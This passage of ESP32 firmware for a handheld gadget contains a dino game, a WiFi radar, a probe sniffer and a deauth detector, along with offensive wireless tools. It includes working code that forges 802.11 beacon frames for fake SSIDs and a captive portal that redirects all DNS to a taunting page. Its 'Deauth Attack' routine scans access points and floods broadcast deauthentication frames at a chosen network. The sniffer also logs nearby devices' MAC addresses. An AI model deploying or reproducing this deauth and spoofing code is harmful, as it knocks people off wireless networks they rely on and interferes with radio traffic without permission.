      tft.fillRect(x + 6, y + 22, 4, 5, COL_ACCENT);
      tft.fillRect(x + 13, y + 22, 5, 4, COL_ACCENT);
    } else {
      tft.fillRect(x + 5, y + 22, 5, 4, COL_ACCENT);
      tft.fillRect(x + 12, y + 22, 4, 5, COL_ACCENT);
    }
  }
}

void drawCactusShape(int x, int type, int h) {
  int bottom = GROUND_Y + 17;
  int top = bottom - h;
  tft.drawRect(x + 4, top - 1, 8, h + 1, COL_ACCENT2);
  tft.fillRect(x + 5, top, 6, h, COL_ACCENT);
  tft.fillRect(x + 1, top + h / 3, 5, 4, COL_ACCENT);
  tft.fillRect(x + 1, top + h / 3, 4, h / 3, COL_ACCENT);
  if (type >= 1) {
    tft.fillRect(x + 10, top + h / 4, 5, 4, COL_ACCENT);
    tft.fillRect(x + 11, top + h / 4, 4, h / 3, COL_ACCENT);
  }
  if (type == 2) {
    tft.fillRect(x + 5, top - 3, 6, 4, COL_ACCENT);
  }
}

void drawBirdShape(int x, int y, int frame) {
  tft.fillRect(x + 4, y, 6, 3, COL_ACCENT);
  if (frame % 2 == 0) {
    tft.fillRect(x + 1, y - 3, 5, 3, COL_ACCENT);
    tft.fillRect(x + 8, y - 3, 5, 3, COL_ACCENT);
  } else {
    tft.fillRect(x + 1, y + 3, 5, 3, COL_ACCENT);
    tft.fillRect(x + 8, y + 3, 5, 3, COL_ACCENT);
  }
  tft.fillRect(x + 9, y - 1, 3, 3, COL_ACCENT);
  tft.drawPixel(x + 10, y, COL_BG);
}

bool checkCollision() {
  int dL = dinoX + 4;
  int dR = dinoX + 4 + 14;
  int dT = (int)dinoY + (dinoDucking ? 12 : 2);
  int dB = (int)dinoY + (dinoDucking ? 26 : 28);

  for (int i = 0; i < CACTUS_MAX; i++) {
    if (!cacti[i].active) continue;
    int cL = cacti[i].x + 1;
    int cR = cacti[i].x + 16;
    int cB = GROUND_Y + 17;
    int cT = cB - cacti[i].h;
    if (dR > cL && dL < cR && dB > cT && dT < cB) return true;
  }

  for (int i = 0; i < BIRD_MAX; i++) {
    if (!birds[i].active) continue;
    int bL = birds[i].x + 1;
    int bR = birds[i].x + 12;
    int bT = birds[i].y - 3;
    int bB = birds[i].y + 6;
    if (dR > bL && dL < bR && dB > bT && dT < bB) return true;
  }
  return false;
}

void spawnCactus(int idx) {
  cacti[idx].active = true;
  cacti[idx].x = 165 + random(0, 40);
  cacti[idx].type = random(0, 3);
  cacti[idx].h = 15 + cacti[idx].type * 6;
}

void spawnBird() {
  for (int i = 0; i < BIRD_MAX; i++) {
    if (!birds[i].active) {
      birds[i].active = true;
      birds[i].x = 165;
      birds[i].y = GROUND_Y - 5 - random(0, 3) * 8;
      birds[i].speed = dinoSpeed + 1.2;
      birds[i].flapFrame = 0;
      return;
    }
  }
}

void dinoFrame() {
  dinoBackground();
  char s[16]; snprintf(s, sizeof(s), "%d", dinoScore);
  text(s, 5, 20, COL_ACCENT);
  char b[20]; snprintf(b, sizeof(b), "HI %d", bestScore);
  text(b, 115, 20, COL_ACCENT2);
  for (int i = 0; i < CACTUS_MAX; i++)
    if (cacti[i].active) drawCactusShape(cacti[i].x, cacti[i].type, cacti[i].h);
  for (int i = 0; i < BIRD_MAX; i++)
    if (birds[i].active) drawBirdShape(birds[i].x, birds[i].y, birds[i].flapFrame);
  drawDinoBody(dinoX, (int)dinoY, dinoDucking, animFrame);
}

void resetDinoGame() {
  dinoX = 18; dinoY = GROUND_Y; dinoVY = 0;
  dinoScore = 0; dinoSpeed = 3.5;
  dinoDead = false; dinoDucking = false;
  animFrame = 0; lastDinoFrame = millis();
  for (int i = 0; i < CACTUS_MAX; i++) cacti[i].active = false;
  spawnCactus(0);
  for (int i = 0; i < BIRD_MAX; i++) birds[i].active = false;
  lastBirdSpawn = millis();
  initClouds();
}

void dinoGameOver() {
  clearScreen();
  centerText("GAME OVER", 20, COL_ACCENT, 2);
  char s[24]; snprintf(s, sizeof(s), "SCORE %d", dinoScore);
  centerText(s, 50, COL_TEXT);
  char b[24]; snprintf(b, sizeof(b), "BEST %d", bestScore);
  centerText(b, 65, COL_ACCENT2);
  centerText("SELECT: retry", 90, COL_DIM);
  centerText("BACK: menu", 102, COL_DIM);
}

void dinoGame() {
  bool restart = true;
  while (restart) {
    restart = false;
    resetDinoGame();

    while (!dinoDead) {
      if (backPressed()) { screen = MAIN; drawMainMenu(); return; }

      if (selectPressed()) {
        if (dinoY >= GROUND_Y - 0.5) {
          dinoVY = -12.5;
          beepTone(2200, 30);
        }
      }

      bool selHeld = (digitalRead(BTN_SELECT) == LOW);
      dinoDucking = (selHeld && dinoY >= GROUND_Y - 0.5);

      unsigned long now = millis();
      if (now - lastDinoFrame >= 25) {
        lastDinoFrame = now;
        animFrame = (animFrame + 1) % 8;

        dinoVY += 0.75;
        dinoY += dinoVY;
        if (dinoY >= GROUND_Y) { dinoY = GROUND_Y; dinoVY = 0; }

        for (int i = 0; i < CACTUS_MAX; i++) {
          if (!cacti[i].active) continue;
          cacti[i].x -= (int)dinoSpeed;
          if (cacti[i].x < -25) {
            cacti[i].active = false;
            dinoScore++;
            dinoSpeed = min(9.0f, dinoSpeed + 0.15f);
            spawnCactus(i);
          }
        }

        for (int i = 0; i < BIRD_MAX; i++) {
          if (!birds[i].active) continue;
          birds[i].x -= birds[i].speed;
          if (animFrame % 2 == 0) birds[i].flapFrame++;
          if (birds[i].x < -20) { birds[i].active = false; dinoScore++; }
        }

        if (dinoScore > 50 && !birds[0].active && !birds[1].active) {
          if (millis() - lastBirdSpawn > 4000 && random(0, 100) < 15) {
            spawnBird();
            lastBirdSpawn = millis();
          }
        }

        if (dinoScore > 15 && !cacti[1].active && random(0, 100) < 8) spawnCactus(1);
        if (dinoScore > 40 && !cacti[2].active && random(0, 100) < 6) spawnCactus(2);

        for (int i = 0; i < CLOUD_MAX; i++) {
          clouds[i].x -= clouds[i].speed;
          if (clouds[i].x < -30) {
            clouds[i].x = 165 + random(0, 40);
            clouds[i].y = 25 + random(0, 25);
          }
        }

        if (checkCollision()) {
          dinoDead = true;
          if (dinoScore > bestScore) bestScore = dinoScore;
          beepError(); delay(200); beepTone(500, 250);
        }
        dinoFrame();
      }
      delay(1);
    }

    dinoGameOver();
    while (true) {
      if (backPressed()) { screen = MAIN; drawMainMenu(); return; }
      if (selectPressed()) { restart = true; break; }
      delay(20);
    }
  }
}

// ================= BEACON SPAM =================
const char* beaconSSIDs[] = {
  "FBI Surveillance Van", "Virus.exe", "Free WiFi (not really)",
  "NSA Mobile Unit 4", "Loading...", "Get off my WiFi",
  "Pretty Fly for a WiFi", "Tell My WiFi Love Her", "Wu Tang LAN",
  "Drop it like its Hotspot", "Router? I hardly know her",
  "Hide Yo Kids Hide Yo WiFi", "It Hurts When IP", "Mom Use This One",
  "The LAN Before Time", "Nacho WiFi", "Silence of the LANs",
  "Martin Router King", "Ping in the North", "Abraham Linksys",
  "Benjamin FrankLAN", "WiFi Art Thou", "404 Network Unavailable",
  "Connecting...", "Totally Not A Virus",
};
const int BEACON_SSID_COUNT = sizeof(beaconSSIDs) / sizeof(beaconSSIDs[0]);
int bsOK = 0, bsErr = 0;

void sendBeacon(const char* ssid, uint8_t channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] &= 0xFE; mac[0] |= 0x02;
  uint8_t packet[128];
  int i = 0;
  packet[i++] = 0x80; packet[i++] = 0x00;
  packet[i++] = 0x00; packet[i++] = 0x00;
  for (int k = 0; k < 6; k++) packet[i++] = 0xFF;
  for (int k = 0; k < 6; k++) packet[i++] = mac[k];
  for (int k = 0; k < 6; k++) packet[i++] = mac[k];
  packet[i++] = 0x00; packet[i++] = 0x00;
  for (int k = 0; k < 8; k++) packet[i++] = 0x00;
  packet[i++] = 0x64; packet[i++] = 0x00;
  packet[i++] = 0x01; packet[i++] = 0x04;
  packet[i++] = 0x00; packet[i++] = ssidLen;
  for (int k = 0; k < ssidLen; k++) packet[i++] = ssid[k];
  packet[i++] = 0x01; packet[i++] = 0x08;
  packet[i++] = 0x82; packet[i++] = 0x84; packet[i++] = 0x8B;
  packet[i++] = 0x96; packet[i++] = 0x0C; packet[i++] = 0x12;
  packet[i++] = 0x18; packet[i++] = 0x24;
  packet[i++] = 0x03; packet[i++] = 0x01; packet[i++] = channel;
  esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, packet, i, false);
  if (r == ESP_OK) bsOK++; else bsErr++;
}

void tickBeaconSpam(bool entered) {
  static int channel = 1, currentIdx = 0;
  static unsigned long lastDraw = 0, lastChannelSwitch = 0;

  if (entered) {
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    channel = 1; currentIdx = 0; bsOK = 0; bsErr = 0;
    lastDraw = 0; lastChannelSwitch = millis();
    clearScreen(); header("Beacon Spam");
    centerText("Activating...", 55, COL_ACCENT, 2);
    beepSuccess(); delay(500);
  }

  for (int i = 0; i < 12; i++) {
    sendBeacon(beaconSSIDs[currentIdx], channel);
    currentIdx = (currentIdx + 1) % BEACON_SSID_COUNT;
  }

  if (millis() - lastChannelSwitch > 80) {
    lastChannelSwitch = millis();
    channel = (channel % 13) + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }

  if (millis() - lastDraw > 200) {
    lastDraw = millis();
    clearScreen(); header("Beacon Spam");
    centerText("ACTIVE", 20, COL_ACCENT, 2);
    char buf[32];
    snprintf(buf, sizeof(buf), "OK: %d  ERR: %d", bsOK, bsErr);
    text(buf, 6, 44, bsErr > 0 ? COL_WARN : COL_TEXT);
    snprintf(buf, sizeof(buf), "Channel: %d", channel);
    text(buf, 6, 60, COL_ACCENT);
    text("SSID:", 6, 76, COL_ACCENT2);
    char shortSsid[22]; truncateTo(beaconSSIDs[currentIdx], shortSsid, 20);
    text(shortSsid, 6, 90, COL_TEXT);
    centerText("BACK: stop", 110, COL_DIM);
  }

  if (backPressed()) {
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    beepBack(); screen = WIFI_MENU; return;
  }
}

// ================= CAPTIVE PORTAL =================
#define PORTAL_SSID "Free WiFi"
WebServer portalServer(80);
DNSServer dnsServer;

const char PORTAL_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi</title><style>
html,body{margin:0;padding:0;height:100%;background:#000}
body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif}
h1{color:#ff8c00;font-size:15vw;margin:0;text-align:center;letter-spacing:2px;word-break:break-word;padding:20px}
</style></head><body><h1>ТЫ ЛОШПЕД</h1></body></html>
)HTML";

void handleRoot()    { portalServer.send_P(200, "text/html; charset=UTF-8", PORTAL_HTML); }
void handleNotFound(){ portalServer.send_P(200, "text/html; charset=UTF-8", PORTAL_HTML); }

int portalClients = 0;
unsigned long lastPortalDraw = 0, portalStart = 0;

void drawCaptivePortalScreen() {
  clearScreen(); header("Captive Portal");
  centerText("ACTIVE", 20, COL_ACCENT, 2);
  text("SSID:", 6, 42, COL_ACCENT2);
  text(PORTAL_SSID, 6, 56, COL_TEXT);
  text("IP:", 6, 72, COL_ACCENT2);
  text(WiFi.softAPIP().toString().c_str(), 6, 86, COL_TEXT);
  char buf[32];
  unsigned long mins = (millis() - portalStart) / 60000;
  snprintf(buf, sizeof(buf), "Clients: %d  Up: %lum", portalClients, mins);
  text(buf, 6, 100, COL_ACCENT);
  centerText("BACK: stop", 116, COL_DIM);
}

void tickCaptivePortal(bool entered) {
  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(PORTAL_SSID);
    delay(300);
    dnsServer.start(53, "*", WiFi.softAPIP());
    portalServer.on("/", HTTP_GET, handleRoot);
    portalServer.onNotFound(handleNotFound);
    portalServer.begin();
    portalClients = 0; portalStart = millis(); lastPortalDraw = 0;
    drawCaptivePortalScreen();
  }
  dnsServer.processNextRequest();
  portalServer.handleClient();
  if (millis() - lastPortalDraw > 500) {
    lastPortalDraw = millis();
    int now = WiFi.softAPgetStationNum();
    if (now != portalClients) {
      if (now > portalClients) beepSuccess(); else beepBack();
      portalClients = now;
      drawCaptivePortalScreen();
    }
  }
  if (backPressed()) {
    portalServer.stop(); dnsServer.stop();
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA);
    screen = WIFI_MENU; return;
  }
}

// ================= PROBE SNIFFER =================
struct ProbeEntry { uint8_t mac[6]; char ssid[24]; int8_t rssi; unsigned long lastSeen; };
const int PROBE_MAX = 20;
ProbeEntry probeList[PROBE_MAX];
int probeCount = 0;
volatile unsigned long probePackets = 0, probeLastSeen = 0;
volatile char probeLastSSID[24] = "";
volatile uint8_t probeLastMAC[6] = {0};
volatile int8_t probeLastRSSI = 0;

int findProbe(const uint8_t* mac) {
  for (int i = 0; i < probeCount; i++)
    if (memcmp(probeList[i].mac, mac, 6) == 0) return i;
  return -1;
}
void shiftProbes() {
  for (int i = 0; i < PROBE_MAX - 1; i++) probeList[i] = probeList[i + 1];
  probeCount = PROBE_MAX - 1;
}

void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  if ((p[0] & 0xF0) != 0x40) return;

  probePackets++;
  probeLastSeen = millis();
  probeLastRSSI = pkt->rx_ctrl.rssi;
  memcpy((void*)probeLastMAC, p + 10, 6);

  probeLastSSID[0] = '\0';
  for (int i = 24; i < len - 2; ) {
    uint8_t tagId = p[i], tagLen = p[i + 1];
    if (i + 2 + tagLen > len) break;
    if (tagId == 0x00) {
      int l = tagLen > 23 ? 23 : tagLen;
      memcpy((void*)probeLastSSID, p + i + 2, l);
      probeLastSSID[l] = '\0';
      break;
    }
    i += 2 + tagLen;
  }
  if (probeLastSSID[0] == '\0') {
    strncpy((char*)probeLastSSID, "<hidden>", 23);
    probeLastSSID[23] = '\0';
  }
}

void updateProbeList() {
  if (probeLastSeen == 0) return;
  int idx = findProbe((const uint8_t*)probeLastMAC);
  if (idx < 0) {
    if (probeCount >= PROBE_MAX) shiftProbes();
    idx = probeCount++;
    memcpy(probeList[idx].mac, (const void*)probeLastMAC, 6);
    beepTone(2400, 20);
  }
  strncpy(probeList[idx].ssid, (const char*)probeLastSSID, 23);
  probeList[idx].ssid[23] = '\0';
  probeList[idx].rssi = probeLastRSSI;
  probeList[idx].lastSeen = probeLastSeen;
  probeLastSeen = 0;
}

void macToString(const uint8_t* mac, char* out) {
  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int probeScroll = 0;
const int PROBE_VISIBLE = 5;
const int PROBE_ROW_H = 12;

void drawSnifferScreen() {
  clearScreen(); header("Probe Sniffer");
  centerText("SNIFFING", 20, COL_ACCENT, 2);
  char buf[40];
  snprintf(buf, sizeof(buf), "Packets: %lu", probePackets);
  text(buf, 4, 38, COL_TEXT);
  snprintf(buf, sizeof(buf), "Devices: %d", probeCount);
  text(buf, 4, 50, COL_ACCENT);

  if (probeCount == 0) { centerText("Listening...", 80, COL_ACCENT2); return; }

  int start = probeScroll;
  if (start > probeCount - PROBE_VISIBLE) start = probeCount - PROBE_VISIBLE;
  if (start < 0) start = 0;

  for (int row = 0; row < PROBE_VISIBLE; row++) {
    int i = start + row;
    if (i >= probeCount) break;
    int y = 64 + row * PROBE_ROW_H;
    char mac[24]; macToString(probeList[i].mac, mac);
    text(mac, 3, y, COL_TEXT);
    const char* vendor = ouiVendor(probeList[i].mac);
    text(vendor, 70, y, COL_ACCENT2);
    char r[6]; snprintf(r, sizeof(r), "%d", probeList[i].rssi);
    text(r, 142, y, probeList[i].rssi > -60 ? COL_ACCENT : COL_DIM);
  }
}

void tickSniffer(bool entered) {
  static unsigned long lastDraw = 0, lastHop = 0;
  static int chIdx = 0;
  static const uint8_t channels[] = {1, 6, 11};

  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    probeCount = 0; probePackets = 0; probeLastSeen = 0;
    probeLastSSID[0] = '\0'; probeScroll = 0;
    esp_wifi_set_promiscuous_rx_cb(probeCallback);
    esp_wifi_set_promiscuous(true);
    clearScreen(); header("Probe Sniffer");
    centerText("Starting...", 55, COL_ACCENT, 2);
    delay(300);
    lastDraw = 0; lastHop = millis(); chIdx = 1;
  }

  if (millis() - lastHop > 5000) {
    lastHop = millis();
    chIdx = (chIdx + 1) % 3;
    esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
  }

  updateProbeList();

  if (backPressed()) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    screen = WIFI_MENU; return;
  }

  if (nextPressed()) {
    probeScroll++;
    if (probeScroll > probeCount - 1) probeScroll = probeCount - 1;
    if (probeScroll < 0) probeScroll = 0;
    lastDraw = 0;
  }

  if (millis() - lastDraw > 300) { lastDraw = millis(); drawSnifferScreen(); }
}

// ================= DEAUTH ATTACK =================
#define DEAUTH_MAX_TARGETS 10
struct DeauthTarget { uint8_t bssid[6]; uint8_t channel; char ssid[24]; int8_t rssi; };
DeauthTarget deauthTargets[DEAUTH_MAX_TARGETS];
int deauthTargetCount = 0, deauthCurrent = 0, deauthScroll = 0;
const int DEAUTH_VISIBLE = 5, DEAUTH_ROW_H = 14;
unsigned long deauthPackets = 0, lastDeauthDraw = 0, lastDeauthSend = 0;
bool deauthRunning = false;

void sendDeauthFrame(const uint8_t* bssid, const uint8_t* client, uint8_t channel) {
  uint8_t packet[26];
  int i = 0;
  packet[i++] = 0xC0; packet[i++] = 0x00;
  packet[i++] = 0x00; packet[i++] = 0x00;
  for (int k = 0; k < 6; k++) packet[i++] = client[k];
  for (int k = 0; k < 6; k++) packet[i++] = bssid[k];
  for (int k = 0; k < 6; k++) packet[i++] = bssid[k];
  packet[i++] = 0x00; packet[i++] = 0x00;
  packet[i++] = 0x07; packet[i++] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, i, false);
  deauthPackets++;
}

void drawDeauthScreen() {
  clearScreen(); header("Deauth Attack");
  char buf[32];
  snprintf(buf, sizeof(buf), "Packets: %lu", deauthPackets);
  text(buf, 4, 22, COL_TEXT);
  snprintf(buf, sizeof(buf), "Targets: %d", deauthTargetCount);
  text(buf, 4, 34, COL_ACCENT);

  if (deauthTargetCount == 0) {
    centerText("No targets", 70, COL_WARN);
    centerText("BACK: exit", 110, COL_DIM);
    return;
  }

  int start = deauthScroll;
  if (start > deauthTargetCount - DEAUTH_VISIBLE) start = deauthTargetCount - DEAUTH_VISIBLE;
  if (start < 0) start = 0;

  for (int row = 0; row < DEAUTH_VISIBLE; row++) {
    int i = start + row;
    if (i >= deauthTargetCount) break;
    int y = 48 + row * DEAUTH_ROW_H;
    bool sel = (i == deauthCurrent);
    if (sel) tft.fillRoundRect(2, y - 1, 156, 13, 2, COL_ACCENT);
    char shortSsid[15]; truncateTo(deauthTargets[i].ssid, shortSsid, 14);
    text(shortSsid, 5, y + 1, sel ? COL_BG : COL_TEXT);
    char ch[6]; snprintf(ch, sizeof(ch), "ch%02d", deauthTargets[i].channel);
    text(ch, 112, y + 1, sel ? COL_BG : COL_ACCENT);
  }
  centerText("NEXT: sel  SELECT: go", 124, COL_DIM);
}

void scanDeauthTargets() {
  clearScreen(); header("Deauth Attack");
  centerText("Scanning...", 55, COL_ACCENT, 2);
  WiFi.scanDelete();
  WiFi.scanNetworks(true, true);
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) delay(200);

  int n = WiFi.scanComplete();
  deauthTargetCount = 0;
  for (int i = 0; i < n && deauthTargetCount < DEAUTH_MAX_TARGETS; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    if (!bssid) continue;
    memcpy(deauthTargets[deauthTargetCount].bssid, bssid, 6);
    deauthTargets[deauthTargetCount].channel = WiFi.channel(i);
    String s = WiFi.SSID(i);
    if (s.length() == 0) s = "<hidden>";
    strncpy(deauthTargets[deauthTargetCount].ssid, s.c_str(), 23);
    deauthTargets[deauthTargetCount].ssid[23] = '\0';
    deauthTargets[deauthTargetCount].rssi = WiFi.RSSI(i);
    deauthTargetCount++;
  }
  if (deauthTargetCount == 0) {
    message("Deauth", "No targets", nullptr, COL_WARN);
    delay(800);
  }
  deauthCurrent = 0; deauthScroll = 0;
}

void tickDeauth(bool entered) {
  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    deauthPackets = 0; deauthRunning = false;
    scanDeauthTargets();
    drawDeauthScreen();
    lastDeauthDraw = millis();
  }

  if (backPressed()) {
    deauthRunning = false;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    screen = WIFI_MENU; return;
  }

  if (nextPressed() && deauthTargetCount > 0) {
    deauthCurrent = (deauthCurrent + 1) % deauthTargetCount;
    if (deauthCurrent >= deauthScroll + DEAUTH_VISIBLE)
      deauthScroll = deauthCurrent - DEAUTH_VISIBLE + 1;
    if (deauthCurrent < deauthScroll) deauthScroll = deauthCurrent;
    drawDeauthScreen();
  }

  if (selectPressed()) {
    deauthRunning = !deauthRunning;
    if (deauthRunning) {
      esp_wifi_set_channel(deauthTargets[deauthCurrent].channel, WIFI_SECOND_CHAN_NONE);
      beepSuccess();
    } else { drawDeauthScreen(); beepBack(); }
  }

  if (deauthRunning && deauthTargetCount > 0) {
    unsigned long now = millis();
    if (now - lastDeauthSend > 10) {
      lastDeauthSend = now;
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthFrame(deauthTargets[deauthCurrent].bssid, broadcast, deauthTargets[deauthCurrent].channel);
    }
    if (now - lastDeauthDraw > 250) {
      lastDeauthDraw = now;
      clearScreen(); header("Deauth Attack");
      centerText("ATTACKING", 18, COL_WARN, 2);
      char buf[32];
      snprintf(buf, sizeof(buf), "Packets: %lu", deauthPackets);
      text(buf, 6, 44, COL_TEXT);
      char shortSsid[20]; truncateTo(deauthTargets[deauthCurrent].ssid, shortSsid, 18);
      centerText(shortSsid, 60, COL_ACCENT);
      char chbuf[16]; snprintf(chbuf, sizeof(chbuf), "Channel: %d", deauthTargets[deauthCurrent].channel);
      centerText(chbuf, 76, COL_ACCENT2);
      centerText("SELECT: stop", 100, COL_DIM);
      centerText("BACK: exit", 114, COL_DIM);
    }
  }
}

// ================= WIFI RADAR =================
const int RADAR_CX = 80, RADAR_CY = 75, RADAR_MAX_R = 55;
struct RadarBlip { char ssid[20]; int8_t rssi; float angle, radius; bool open; uint8_t channel; bool valid; };
const int RADAR_MAX = 20;
RadarBlip radarBlips[RADAR_MAX];
int radarCount = 0, radarMode = 0;
unsigned long lastRadarScan = 0;
const int RADAR_SCAN_INTERVAL = 6000;

float rssiToRadius(int8_t rssi) {
  const int RSSI_MIN = -95, RSSI_MAX = -30;
  if (rssi < RSSI_MIN) rssi = RSSI_MIN;
  if (rssi > RSSI_MAX) rssi = RSSI_MAX;
  float t = (float)(rssi - RSSI_MIN) / (float)(RSSI_MAX - RSSI_MIN);
  return RADAR_MAX_R * (1.0 - t) + 6;
}
uint16_t rssiColor(int8_t rssi, bool open) {
  if (rssi > -50) return COL_ACCENT;
  if (rssi > -70) return COL_ACCENT2;
  return COL_DIM;
}

void scanRadar() {
  WiFi.scanDelete();
  WiFi.scanNetworks(true, true);
  unsigned long start = millis();
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - start < 8000) delay(150);
  int n = WiFi.scanComplete();
  if (n < 0) n = 0;

  radarCount = 0;
  for (int i = 0; i < n && radarCount < RADAR_MAX; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<hidden>";
    bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
    if (radarMode == 1 && !open) continue;
    int8_t rssi = WiFi.RSSI(i);
    strncpy(radarBlips[radarCount].ssid, ssid.c_str(), 19);
    radarBlips[radarCount].ssid[19] = '\0';
    radarBlips[radarCount].rssi = rssi;
    radarBlips[radarCount].open = open;
    radarBlips[radarCount].channel = WiFi.channel(i);
    radarBlips[radarCount].radius = rssiToRadius(rssi);
    uint8_t* bssid = WiFi.BSSID(i);
    float seed = bssid ? (bssid[5] / 255.0f) : (i / 20.0f);
    radarBlips[radarCount].angle = seed * 2 * PI;
    radarBlips[radarCount].valid = true;
    radarCount++;
  }
}

void drawRadarScreen() {
  clearScreen(); header("WiFi Radar");
  tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R, COL_DIM);
  tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R * 2 / 3, COL_DIM);
  tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R / 3, COL_DIM);
  tft.drawFastHLine(RADAR_CX - RADAR_MAX_R, RADAR_CY, RADAR_MAX_R * 2, COL_DIM);
  tft.drawFastVLine(RADAR_CX, RADAR_CY - RADAR_MAX_R, RADAR_MAX_R * 2, COL_DIM);
  tft.fillCircle(RADAR_CX, RADAR_CY, 3, COL_ACCENT);
  tft.drawCircle(RADAR_CX, RADAR_CY, 5, COL_ACCENT);

  const char* modeNames[] = {"ALL", "OPEN", "MY"};
  text(modeNames[radarMode], 4, 22, COL_ACCENT2);
  char buf[24]; snprintf(buf, sizeof(buf), "%d", radarCount);
  text(buf, 145, 22, COL_TEXT);

  for (int i = 0; i < radarCount; i++) {
    float x = RADAR_CX + cos(radarBlips[i].angle) * radarBlips[i].radius;
    float y = RADAR_CY + sin(radarBlips[i].angle) * radarBlips[i].radius;
    int xi = (int)x, yi = (int)y;
    if (xi < 2 || xi > 158 || yi < 20 || yi > 127) continue;
    uint16_t col = rssiColor(radarBlips[i].rssi, radarBlips[i].open);
    tft.fillCircle(xi, yi, 2, col);
    if (radarBlips[i].open) tft.drawCircle(xi, yi, 4, COL_ACCENT);
  }
  centerText("NEXT: mode  BACK: exit", 118, COL_DIM);
}

void tickRadar(bool entered) {
  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(150);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    clearScreen(); header("WiFi Radar");
    centerText("Scanning...", 60, COL_ACCENT, 2);
    scanRadar();
    drawRadarScreen();
    lastRadarScan = millis();
  }
  if (millis() - lastRadarScan > RADAR_SCAN_INTERVAL) {
    lastRadarScan = millis();
    scanRadar();
    drawRadarScreen();
  }
  if (backPressed()) { screen = WIFI_MENU; return; }
  if (nextPressed()) {
    radarMode = (radarMode + 1) % 3;
    scanRadar();
    drawRadarScreen();
    lastRadarScan = millis();
  }
}

// ================= DEAUTH DETECTOR =================
volatile unsigned long deauthAttackPackets = 0, deauthLastSeen = 0;
volatile uint8_t deauthAttackerMAC[6] = {0}, deauthTargetMAC[6] = {0};
volatile int8_t deauthAttackerRSSI = 0;
volatile uint8_t deauthLastChannel = 0;
struct DeauthAttackLog { uint8_t attacker[6]; int8_t rssi; unsigned long time; };
const int DD_LOG_MAX = 10;
DeauthAttackLog ddLog[DD_LOG_MAX];
int ddLogCount = 0;
unsigned long ddTotalPackets = 0, lastDDSeenTime = 0;
int ddAlarmFrames = 0;
unsigned long lastDDDraw = 0, lastBeepAttack = 0;

void IRAM_ATTR deauthDetectorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 26) return;
  if ((p[0] & 0xF0) != 0xC0) return;
  ddTotalPackets++;
  deauthLastSeen = millis();
  deauthAttackPackets++;
  lastDDSeenTime = millis();
  deauthAttackerRSSI = pkt->rx_ctrl.rssi;
  deauthLastChannel = pkt->rx_ctrl.channel;
  memcpy((void*)deauthAttackerMAC, p + 10, 6);
  memcpy((void*)deauthTargetMAC,   p + 4,  6);
}

void addDDLog(const uint8_t* mac, int8_t rssi) {
  for (int i = 0; i < ddLogCount; i++) {
    if (memcmp(ddLog[i].attacker, mac, 6) == 0) {
      ddLog[i].rssi = rssi; ddLog[i].time = millis(); return;
    }
  }
  if (ddLogCount < DD_LOG_MAX) {
    memcpy(ddLog[ddLogCount].attacker, mac, 6);
    ddLog[ddLogCount].rssi = rssi;
    ddLog[ddLogCount].time = millis();
    ddLogCount++;
  } else {
    for (int i = 0; i < DD_LOG_MAX - 1; i++) ddLog[i] = ddLog[i + 1];
    memcpy(ddLog[DD_LOG_MAX - 1].attacker, mac, 6);
    ddLog[DD_LOG_MAX - 1].rssi = rssi;
    ddLog[DD_LOG_MAX - 1].time = millis();
  }
}

void drawDDLogScreen() {
  clearScreen(); header("Detector Log");
  if (ddLogCount == 0) {
    centerText("No attacks yet", 60, COL_ACCENT2);
    centerText("BACK: return", 100, COL_DIM);
    return;
  }
